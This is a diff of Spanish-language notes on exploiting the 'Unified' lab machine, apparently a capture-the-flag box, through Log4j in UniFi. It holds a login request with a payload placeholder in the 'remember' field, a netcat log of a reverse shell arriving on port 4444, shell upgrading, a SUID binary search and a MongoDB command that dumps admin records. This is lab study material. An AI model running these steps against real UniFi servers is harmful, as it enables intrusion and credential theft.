@@ -1,3 +1,9 @@
+                                                             EXPLOTACIÓN UNIFIED
+================================================================================================================================================================
+
+**GATHERING INFO**
+================================================================================================================================================================
+
 SITIO DE REFERENCIA
 -------------------
 https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi
@@ -30,7 +36,8 @@ Accept-Language: en-US,en;q=0.9
 {"username":"asdf","password":"asdfas","remember":"<PAYLOAD>","strict":true}
 
 
-
+**BREAKING IN**
+================================================================================================================================================================
 
 DNSLOG
 ------
@@ -119,15 +126,45 @@ CONSIGUIENDO SHELL
 ------------------
 $ script /dev/null -c bash
 
+**ESCALADA PRIVILEGIOS**
+================================================================================================================================================================
 
-
-
-
-
-
-
-MONGODB
+1. SUDO
 -------
+listening on [any] 4444 ...
+connect to [10.10.15.5] from (UNKNOWN) [10.129.153.25] 37402
+script /dev/null -c bash
+Script started, file is /dev/null
+unifi@unified:/usr/lib/unifi$ sudo
+sudo
+bash: sudo: command not found
+unifi@unified:/usr/lib/unifi$ 
+
+
+
+2. SET UID BINARIES
+---------------------
+
+unifi@unified:/usr/lib/unifi$ find / -perm /4000 2>/dev/null > sudis.txt
+
+unifi@unified:/usr/lib/unifi$ cat sudis.txt
+cat sudis.txt
+-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
+unifi@unified:/usr/lib/unifi$  
+
+
+
+
+
+3. MONGODB
+-----------
 unifi@unified:/usr/lib/unifi/bin$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 .forEach(printjson);"e --eval "db.admin.find().
 MongoDB shell version v3.6.3
